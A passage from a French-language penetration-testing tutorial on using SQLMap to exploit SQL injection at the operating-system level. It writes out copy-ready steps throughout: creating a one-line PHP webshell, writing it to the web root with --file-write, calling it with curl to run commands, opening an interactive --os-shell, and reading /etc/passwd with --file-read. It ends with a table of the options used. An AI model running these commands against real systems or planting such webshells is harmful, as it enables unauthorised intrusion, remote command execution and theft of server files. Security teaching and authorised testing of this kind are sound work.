    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
    ```
    {% endcode %}
*   Résultat : Le fichier est écrit, et vous pouvez accéder à la webshell :

    ```bash
    curl http://www.example.com/shell.php?cmd=ls+-la
    ```

***

### <mark style="color:blue;">**2. Exécution de commandes OS**</mark>

SQLMap peut fournir une interface interactive pour exécuter des commandes sur le système distant.

**Commande SQLMap pour un shell OS :**

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

* Méthodes utilisées :
  * Déploiement d’une backdoor ou d’une fonction UDF (User Defined Function).
  * Utilisation de requêtes SQL spécifiques (e.g., `xp_cmdshell` dans MS SQL Server).
*   Exemple d’interaction :

    ```
    os-shell> ls -la
    ```

**Techniques spécifiques :**

*   Pour choisir une technique d'injection spécifique (par exemple, `Error-based`) :

    ```bash
    sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
    ```
* SQLMap peut détecter automatiquement :
  * Le langage web (e.g., PHP).
  * Le répertoire racine du serveur web (e.g., `/var/www/html`).

***

### <mark style="color:blue;">**3. Cas pratique : Lecture et écriture avec SQLMap**</mark>

**Lecture d’un fichier :**

1.  Vérifier les privilèges DBA :

    ```bash
    sqlmap -u "http://www.example.com/?id=1" --is-dba
    ```
2.  Lire un fichier :

    ```bash
    sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
    ```
3. Résultat : Le fichier est sauvegardé localement.

**Écriture d’une webshell :**

1.  Créer une webshell :

    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
2.  Écrire sur le serveur :

    {% code overflow="wrap" %}
    ```bash
    sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
    ```
    {% endcode %}
3.  Accéder à la webshell :

    ```bash
    curl http://www.example.com/shell.php?cmd=ls+-la
    ```

***

### <mark style="color:blue;">**4. Résumé des options SQLMap pour l’exploitation OS**</mark>

| **Option**      | **Description**                               |
| --------------- | --------------------------------------------- |
| `--file-read`   | Lire un fichier distant.                      |
| `--file-write`  | Écrire un fichier distant.                    |
| `--file-dest`   | Chemin de destination pour l’écriture.        |
| `--os-shell`    | Obtenir un shell interactif sur le système.   |
| `--technique=X` | Choisir une technique d’injection spécifique. |
| `--is-dba`      | Vérifier si l’utilisateur est DBA.            |

***
